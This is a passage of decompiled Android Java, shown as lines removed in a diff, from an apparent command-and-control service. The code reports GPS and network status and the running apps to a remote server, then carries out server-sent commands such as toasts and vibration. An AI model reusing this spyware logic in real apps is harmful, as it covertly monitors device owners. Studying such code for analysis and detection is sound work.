-      v11_0.<init>(this.ctx);
-      v6_1.getStatus();
-      Maybe([ARRAY, OBJECT]) v11_1 = new org.json.JSONObject(v6_3);
-      Maybe([ARRAY, OBJECT]) v6_4 = v11_1;
-      v11_1.<init>();
-      Maybe([ARRAY, OBJECT]) v4_0 = v6_4;
-      Maybe([ARRAY, OBJECT]) v11_2 = new org.json.JSONArray(v6_5);
-      Maybe([ARRAY, OBJECT]) v6_6 = v11_2;
-      v11_2.<init>();
-      Maybe([ARRAY, OBJECT]) v5_0 = v6_6;
-    } catch (org.json.JSONException v6_8) {
-      v6_8.printStackTrace();
-      return;
-    }
-    if (!com.example.appcode.appcode.setting.isNetworkEnabled) {
-      v8_3 = "false";
-    } else {
-      v8_3 = "true";
-    }
-    String v8_5;
-    v4_0.put("posnetwork", v8_3);
-    if (!com.example.appcode.appcode.setting.isGPSEnabled) {
-      v8_5 = "false";
-    } else {
-      v8_5 = "true";
-    }
-    v4_0.put("posgps", v8_5);
-    v4_0.put("date", com.example.appcode.appcode.setting.getDate(java.util.Calendar.getInstance().getTimeInMillis()));
-    v5_0.put(v4_0);
-    Maybe([ARRAY, OBJECT]) v11_3 = new org.json.JSONObject(v7_7);
-    Maybe([ARRAY, OBJECT]) v7_8 = v11_3;
-    v11_3.<init>();
-    this.json = v7_8;
-    this.json.put("CID", p13);
-    this.json.put("CMD", p14);
-    this.json.put("userdata", v5_0);
-    Maybe([ARRAY, OBJECT]) v11_4 = new com.example.appcode.appcode.CMDService$HttpAsyncTask(v6_20);
-    Maybe([ARRAY, OBJECT]) v6_21 = v11_4;
-    v11_4.<init>(this);
-    Maybe([ARRAY, OBJECT]) v11_5 = new org.json.JSONObject[1];
-    Maybe([ARRAY, OBJECT]) v7_15 = v11_5;
-    v11_5[0] = this.json;
-    v6_21.execute(v7_15);
-    return;
-  }
-
-  public void sendProcess(String p20, String p21) {
-    try {
-      Maybe([ARRAY, OBJECT]) v18_0 = new org.json.JSONArray(v13_0);
-      Maybe([ARRAY, OBJECT]) v13_1 = v18_0;
-      v18_0.<init>();
-      Maybe([ARRAY, OBJECT]) v4_0 = v13_1;
-      Maybe([ARRAY, OBJECT]) v7_0 = ((android.app.ActivityManager)this.getApplicationContext().getSystemService("activity")).getRunningTasks(100).iterator();
-      Maybe([ARRAY, OBJECT]) v8_0 = this.getApplicationContext().getPackageManager();
-    } catch (Exception v13_30) {
-      if (!com.example.appcode.appcode.setting.errors) {
-        return;
-      } else {
-        android.widget.Toast.makeText(this.getBaseContext(), v13_30.getMessage(), 1).show();
-        return;
-      }
-    }
-    while (v7_0.hasNext()) {
-      try {
-        Maybe([ARRAY, OBJECT]) v18_1 = new org.json.JSONObject(v13_15);
-        Maybe([ARRAY, OBJECT]) v13_16 = v18_1;
-        v18_1.<init>();
-        Maybe([ARRAY, OBJECT]) v9_0 = v13_16;
-        v9_0.put("PRO", v8_0.getApplicationLabel(v8_0.getApplicationInfo(((android.app.ActivityManager$RunningTaskInfo)((android.app.ActivityManager$RunningTaskInfo)v7_0.next())).baseActivity.getPackageName(), 128)).toString());
-        v4_0.put(v9_0);
-      } catch (Exception v13_28) {
-        v13_28.printStackTrace();
-      }
-    }
-
-    Maybe([ARRAY, OBJECT]) v18_2 = new org.json.JSONObject(v14_10);
-    Maybe([ARRAY, OBJECT]) v14_11 = v18_2;
-    v18_2.<init>();
-    this.json = v14_11;
-    this.json.put("userdata", v4_0);
-    this.json.put("CMD", "process");
-    this.json.put("CID", p20);
-    this.json.put("CMD", p21);
-    Maybe([ARRAY, OBJECT]) v18_3 = new com.example.appcode.appcode.CMDService$HttpAsyncTask(v13_44);
-    Maybe([ARRAY, OBJECT]) v13_45 = v18_3;
-    v18_3.<init>(this);
-    Maybe([ARRAY, OBJECT]) v18_4 = new org.json.JSONObject[1];
-    Maybe([ARRAY, OBJECT]) v14_19 = v18_4;
-    v18_4[0] = this.json;
-    v13_45.execute(v14_19);
-    return;
-  }
-
-  public void showToast(org.json.JSONObject p8, String p9) {
-    try {
-      if (p8.getJSONObject("header").has("VAL")) {
-        android.widget.Toast.makeText(this.getBaseContext(), p8.getJSONObject("header").getString("VAL"), 1).show();
-        this.updateStatus(p9, "3");
-      }
-    } catch (Exception v4_3) {
-      this.updateStatus(p9, "-1");
-    }
-    return;
-  }
-
-  public void updateStatus(String p11, String p12) {
-    try {
-      Maybe([ARRAY, OBJECT]) v9_0 = new org.json.JSONObject(v5_0);
-      Maybe([ARRAY, OBJECT]) v5_1 = v9_0;
-      v9_0.<init>();
-      this.json = v5_1;
-      this.json.put("CID", p11);
-      this.json.put("STA", p12);
-      this.json.put("CMD", "update");
-      Maybe([ARRAY, OBJECT]) v9_1 = new com.example.appcode.appcode.CMDService$HttpAsyncTask(v4_7);
-      Maybe([ARRAY, OBJECT]) v4_8 = v9_1;
-      v9_1.<init>(this);
-      Maybe([ARRAY, OBJECT]) v9_2 = new org.json.JSONObject[1];
-      Maybe([ARRAY, OBJECT]) v5_8 = v9_2;
-      v9_2[0] = this.json;
-      v4_8.execute(v5_8);
-    } catch (Exception v4_9) {
-    }
-    return;
-  }
-
-  public void vibrate(String p11, String p12) {
-    try {
-      Maybe([LONG, DOUBLE]) v3_0 = Long.parseLong(p11);
-    } catch (Exception v6_4) {
-      this.updateStatus(p12, "-1");
-      return;
-    }
-    if (v3_0 >= 10000) {
-      return;
-    } else {
-      ((android.os.Vibrator)this.getSystemService("vibrator")).vibrate(v3_0);
-      this.updateStatus(p12, "3");
-      return;
-    }
-  }
-}
 </i>
 </pre>
     
